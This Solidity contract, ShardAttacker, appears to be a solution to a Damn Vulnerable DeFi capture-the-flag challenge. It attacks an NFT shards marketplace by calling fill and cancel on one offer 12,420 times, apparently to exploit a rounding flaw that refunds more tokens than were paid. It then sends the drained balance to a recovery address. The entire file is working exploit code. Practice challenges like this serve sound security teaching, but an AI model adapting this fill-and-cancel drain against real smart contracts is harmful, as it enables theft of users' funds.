pragma solidity =0.8.25;
import {DamnValuableToken} from "../DamnValuableToken.sol";


interface IShardsNFTMarketplace{
    function fill(uint64 offerId, uint256 want) external returns (uint256 purchaseIndex);
    function cancel(uint64 offerId, uint256 purchaseIndex) external;
}

contract ShardAttacker {

    IShardsNFTMarketplace market;
    address recovery;
    uint256 constant MARKETPLACE_INITIAL_RATE = 75e15;
    uint112 constant NFT_OFFER_PRICE = 1_000_000e6;
    uint112 constant NFT_OFFER_SHARDS = 10_000_000e18;
    DamnValuableToken token;

    constructor(address _market, address _recovery, address _token){
        market = IShardsNFTMarketplace(_market);
        recovery = _recovery;
        token = DamnValuableToken(_token);
    }

    function attack() public {
        uint256 i = 0; 
        uint256 count = 10_000_000e18/100;

        for(i=0; i<12420; i++){
            uint256 pi = market.fill(1,130);
            market.cancel(1,pi);
        }

        token.transfer(recovery, token.balanceOf(address(this)));
    }
}